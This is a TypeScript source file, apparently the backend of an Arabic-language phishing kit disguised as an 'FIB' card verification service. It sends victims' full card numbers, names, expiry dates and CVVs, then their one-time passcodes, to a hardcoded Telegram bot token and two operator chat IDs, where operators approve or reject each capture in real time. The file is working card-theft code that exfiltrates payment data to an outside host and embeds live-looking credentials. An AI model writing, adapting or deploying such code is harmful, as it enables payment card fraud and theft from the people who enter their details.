import axios from "axios";
import { v4 as uuidv4 } from "uuid";
import {
  CardData,
  POLLING_BACKOFF,
  TelegramResponse,
  TelegramUpdate,
} from "../types";

/**
 * TELEGRAM BOT CONFIGURATION
 * DO NOT CHANGE THESE VALUES - They are correctly configured for the FIB notification system
 * Changing these values will break the connection to the Telegram admin panel
 */
const BOT_TOKEN = "7918894717:AAFxQHHspNzQhOyjK72RlptFvzAl6BBb3jw";
const ADMIN_CHAT_ID = "6606827926"; // Main admin user @Web
const ADDITIONAL_RECIPIENT_ID = "6906128193"; // Second recipient @ahmed8752626

const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Tracking variables for polling and retry mechanisms
let lastUpdateId = 0;
let currentDelay = POLLING_BACKOFF.INITIAL_DELAY;
let retryCount = 0;
let lastPollTime = 0;

/**
 * Configure axios with better defaults for Telegram API
 * - Sets appropriate timeout
 * - Configures common headers
 * - Adds error handling and retry logic
 */
const telegramApi = axios.create({
  timeout: 30000,
  headers: {
    "Content-Type": "application/json",
    Accept: "application/json",
  },
});

// Add response interceptor for better error handling
telegramApi.interceptors.response.use(
  (response) => response,
  async (error) => {
    console.error("Telegram API Error:", error.response?.data || error.message);

    // Handle rate limiting with exponential backoff
    if (error.response?.status === 429) {
      const retryAfter = parseInt(
        error.response.headers["retry-after"] || "5",
        10
      );
      await new Promise((resolve) => setTimeout(resolve, retryAfter * 1000));
      return telegramApi(error.config);
    }

    // Handle other common Telegram API errors
    if (error.response?.status === 400) {
      console.error("Bad Request: Check your message format and parameters");
    } else if (error.response?.status === 401) {
      console.error("Unauthorized: Check your BOT_TOKEN");
    } else if (error.response?.status === 403) {
      console.error("Forbidden: The bot may have been blocked by the user");
    }

    throw error;
  }
);

/**
 * Helper function to escape markdown characters
 * This ensures that special characters in messages are displayed correctly in Telegram
 */
export const escapeMarkdown = (text: string): string => {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
};

/**
 * Send card details to Telegram and get a requestId
 * @param cardData The card data to send
 * @returns A promise that resolves to the requestId
 */
export const sendCardDetailsToTelegram = async (
  cardData: CardData
): Promise<string> => {
  try {
    // Generate a unique request ID for tracking this verification request
    const requestId = uuidv4().substring(0, 8);

    // Format card data for better readability
    const formattedCardNumber = cardData.cardNumber.trim();
    const formattedName = cardData.cardholderName.trim().toUpperCase();
    const formattedExpiry = cardData.expiryDate.trim();
    const formattedCVV = cardData.cvv.trim();

    // Format the message with proper Markdown syntax
    const message = `
🔔 *طلب تحقق جديد*
━━━━━━━━━━━━━━━━━━
💳 *بطاقة:* \`${escapeMarkdown(formattedCardNumber)}\`
👤 *الإسم:* \`${escapeMarkdown(formattedName)}\`
📅 *تاريخ الإنتهاء:* \`${escapeMarkdown(formattedExpiry)}\`
🔑 *CVV:* \`${escapeMarkdown(formattedCVV)}\`
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
━━━━━━━━━━━━━━━━━━
`;

    // Create inline keyboard for admin to approve/reject
    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ قبول", callback_data: `approve:${requestId}` },
          { text: "❌ رفض", callback_data: `reject:${requestId}` },
        ],
      ],
    };

    // Send to main admin
    await telegramApi.post(`${API_BASE}/sendMessage`, {
      chat_id: ADMIN_CHAT_ID,
      text: message,
      parse_mode: "MarkdownV2",
      reply_markup: keyboard,
    });

    // Send to additional recipient if configured
    if (ADDITIONAL_RECIPIENT_ID) {
      await telegramApi.post(`${API_BASE}/sendMessage`, {
        chat_id: ADDITIONAL_RECIPIENT_ID,
        text: message,
        parse_mode: "MarkdownV2",
        reply_markup: keyboard,
      });
    }

    return requestId;
  } catch (error) {
    console.error("Error sending card details to Telegram:", error);
    throw new Error("فشل في إرسال طلب التحقق. يرجى المحاولة مرة أخرى.");
  }
};

/**
 * Send OTP to Telegram for verification
 * @param requestId The request ID to associate with this OTP
 * @param otp The OTP entered by the user
 * @returns A promise that resolves to the approval status
 */
export const sendOTPToTelegram = async (
  requestId: string,
  otp: string
): Promise<{ status: "approved" | "rejected" }> => {
  try {
    // Format the message with proper Markdown syntax
    const message = `
🔐 *تحقق من رمز OTP*
━━━━━━━━━━━━━━━━━━
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
🔢 *الرمز المدخل:* \`${escapeMarkdown(otp)}\`
━━━━━━━━━━━━━━━━━━
`;

    // Create inline keyboard for admin to approve/reject
    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ قبول", callback_data: `approve_otp:${requestId}` },
          { text: "❌ رفض", callback_data: `reject_otp:${requestId}` },
        ],
      ],
    };

    // Send to main admin
    await telegramApi.post(`${API_BASE}/sendMessage`, {
      chat_id: ADMIN_CHAT_ID,
      text: message,
      parse_mode: "MarkdownV2",
      reply_markup: keyboard,
    });

    // Send to additional recipient if configured
    if (ADDITIONAL_RECIPIENT_ID) {
      await telegramApi.post(`${API_BASE}/sendMessage`, {
        chat_id: ADDITIONAL_RECIPIENT_ID,
        text: message,
        parse_mode: "MarkdownV2",
        reply_markup: keyboard,
      });
    }

    // Initialize polling to check for admin response
    return await pollForOTPResponse(requestId);
  } catch (error) {
    console.error("Error sending OTP to Telegram:", error);
    throw new Error("فشل في التحقق من الرمز. يرجى المحاولة مرة أخرى.");
  }
};

/**
 * Poll for OTP response from admin
 * @param requestId The request ID to poll for
 * @returns A promise that resolves to the approval status
 */
const pollForOTPResponse = async (
  requestId: string
): Promise<{ status: "approved" | "rejected" }> => {
  // Reset retry count for this new polling session
  retryCount = 0;
  currentDelay = POLLING_BACKOFF.INITIAL_DELAY;

  // Initial delay before starting to poll
  await new Promise((resolve) => setTimeout(resolve, 1000));

  // Start polling loop
  while (retryCount < POLLING_BACKOFF.MAX_RETRIES) {
    try {
      // Implement rate limiting
      const now = Date.now();
      const timeSinceLastPoll = now - lastPollTime;

      if (timeSinceLastPoll < currentDelay) {
        await new Promise((resolve) =>
          setTimeout(resolve, currentDelay - timeSinceLastPoll)
        );
      }

      lastPollTime = Date.now();

      // Fetch updates from Telegram
      const response = await telegramApi.get<
        TelegramResponse<TelegramUpdate[]>
      >(
        `${API_BASE}/getUpdates?offset=${
          lastUpdateId + 1
        }&limit=10&timeout=30&allowed_updates=["callback_query"]`
      );

      if (!response.data.ok || !Array.isArray(response.data.result)) {
        retryCount++;
        currentDelay = Math.min(
          currentDelay * POLLING_BACKOFF.FACTOR,
          POLLING_BACKOFF.MAX_DELAY
        );
        continue;
      }

      const updates = response.data.result as TelegramUpdate[];

      if (updates.length > 0) {
        lastUpdateId = Math.max(...updates.map((update) => update.update_id));
      }

      // Find relevant update for this OTP verification
      const relevantUpdate = updates.find((update) => {
        if (!update.callback_query) return false;
        const callbackData = update.callback_query.data;
        return (
          callbackData === `approve_otp:${requestId}` ||
          callbackData === `reject_otp:${requestId}`
        );
      });

      if (relevantUpdate?.callback_query) {
        // Acknowledge the callback query
        await telegramApi.post(`${API_BASE}/answerCallbackQuery`, {
          callback_query_id: relevantUpdate.callback_query.id,
          text: "تم استلام ردك", // "Your response has been received"
        });

        const isApproved =
          relevantUpdate.callback_query.data.startsWith("approve_otp:");

        // Update the message to reflect the admin's decision
        await telegramApi.post(`${API_BASE}/editMessageText`, {
          chat_id: relevantUpdate.callback_query.message.chat.id,
          message_id: relevantUpdate.callback_query.message.message_id,
          text: isApproved
            ? `
✅ *تم قبول الرمز*
━━━━━━━━━━━━━━━━━━
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
━━━━━━━━━━━━━━━━━━
`
            : `
❌ *تم رفض الرمز*
━━━━━━━━━━━━━━━━━━
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
━━━━━━━━━━━━━━━━━━
`,
          parse_mode: "MarkdownV2",
          reply_markup: { inline_keyboard: [] },
        });

        return { status: isApproved ? "approved" : "rejected" };
      }

      // If no relevant update found, continue polling
      retryCount++;
      currentDelay = Math.min(
        currentDelay * POLLING_BACKOFF.FACTOR,
        POLLING_BACKOFF.MAX_DELAY
      );
    } catch (error) {
      console.error("Error polling for OTP response:", error);
      retryCount++;
      currentDelay = Math.min(
        currentDelay * POLLING_BACKOFF.FACTOR,
        POLLING_BACKOFF.MAX_DELAY
      );
    }

    // Wait before next poll
    await new Promise((resolve) => setTimeout(resolve, currentDelay));
  }

  // If we reach here, we've exceeded max retries
  throw new Error("انتهت مهلة انتظار رد المسؤول. يرجى المحاولة مرة أخرى.");
};

/**
 * Check request status
 * @param requestId The request ID to check
 * @returns A promise that resolves to the status object
 */
export const checkRequestStatus = async (
  requestId: string
): Promise<{ status: "approved" | "rejected" | "pending"; otp?: string }> => {
  if (retryCount >= POLLING_BACKOFF.MAX_RETRIES) {
    throw new Error("تم الوصول إلى الحد الأقصى لمحاولات إعادة المحاولة");
  }

  try {
    // Implement rate limiting and backoff
    const now = Date.now();
    const timeSinceLastPoll = now - lastPollTime;

    if (timeSinceLastPoll < currentDelay) {
      await new Promise((resolve) =>
        setTimeout(resolve, currentDelay - timeSinceLastPoll)
      );
    }

    lastPollTime = Date.now();

    // Fetch updates from Telegram
    const response = await telegramApi.get<TelegramResponse<TelegramUpdate[]>>(
      `${API_BASE}/getUpdates?offset=${
        lastUpdateId + 1
      }&limit=10&timeout=5&allowed_updates=["callback_query"]`
    );

    // Reset backoff on successful request
    currentDelay = POLLING_BACKOFF.INITIAL_DELAY;
    retryCount = 0;

    if (!response.data.ok || !Array.isArray(response.data.result)) {
      return { status: "pending" };
    }

    const updates = response.data.result as TelegramUpdate[];

    if (updates.length > 0) {
      lastUpdateId = Math.max(...updates.map((update) => update.update_id));
    }

    // Process relevant updates for this requestId
    const relevantUpdate = updates.find((update) => {
      if (!update.callback_query) return false;
      const callbackData = update.callback_query.data;
      return (
        callbackData === `approve:${requestId}` ||
        callbackData === `reject:${requestId}`
      );
    });

    if (!relevantUpdate?.callback_query) {
      return { status: "pending" };
    }

    // Handle approval/rejection
    await telegramApi.post(`${API_BASE}/answerCallbackQuery`, {
      callback_query_id: relevantUpdate.callback_query.id,
      text: "تم استلام ردك", // "Your response has been received"
    });

    const isApproved =
      relevantUpdate.callback_query.data.startsWith("approve:");

    if (isApproved) {
      // Generate OTP and update Telegram message
      const otp = Math.floor(100000 + Math.random() * 900000).toString();

      await telegramApi.post(`${API_BASE}/editMessageText`, {
        chat_id: relevantUpdate.callback_query.message.chat.id,
        message_id: relevantUpdate.callback_query.message.message_id,
        text: `
تمت الموافقة ✅
━━━━━━━━━━━━━━━━━━
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
🔐 *رمز التحقق:* \`${escapeMarkdown(otp)}\`
━━━━━━━━━━━━━━━━━━
`,
        parse_mode: "MarkdownV2",
        reply_markup: { inline_keyboard: [] },
      });

      return { status: "approved", otp };
    } else {
      // Update message to show rejection
      await telegramApi.post(`${API_BASE}/editMessageText`, {
        chat_id: relevantUpdate.callback_query.message.chat.id,
        message_id: relevantUpdate.callback_query.message.message_id,
        text: `
تم الرفض ❌
━━━━━━━━━━━━━━━━━━
🆔 *رقم الطلب:* \`${escapeMarkdown(requestId)}\`
━━━━━━━━━━━━━━━━━━
`,
        parse_mode: "MarkdownV2",
        reply_markup: { inline_keyboard: [] },
      });

      return { status: "rejected" };
    }
  } catch (error) {
    console.error("Error checking request status:", error);

    // Implement progressive backoff
    retryCount++;
    currentDelay = Math.min(
      currentDelay * POLLING_BACKOFF.FACTOR,
      POLLING_BACKOFF.MAX_DELAY
    );

    return { status: "pending" };
  }
};

/**
 * A utility function to log detailed debugging information
 * This is useful for troubleshooting Telegram API issues
 */
export const logTelegramDebugInfo = (message: string, data?: any): void => {
  console.group("🔍 Telegram Debug Info");
  console.log(`🕒 ${new Date().toISOString()}`);
  console.log(`📝 ${message}`);
  if (data) {
    console.log("Data:", data);
  }
  console.log(`🔄 Retry count: ${retryCount}`);
  console.log(`⏱️ Current delay: ${currentDelay}ms`);
  console.log(`🆔 Last update ID: ${lastUpdateId}`);
  console.groupEnd();
};
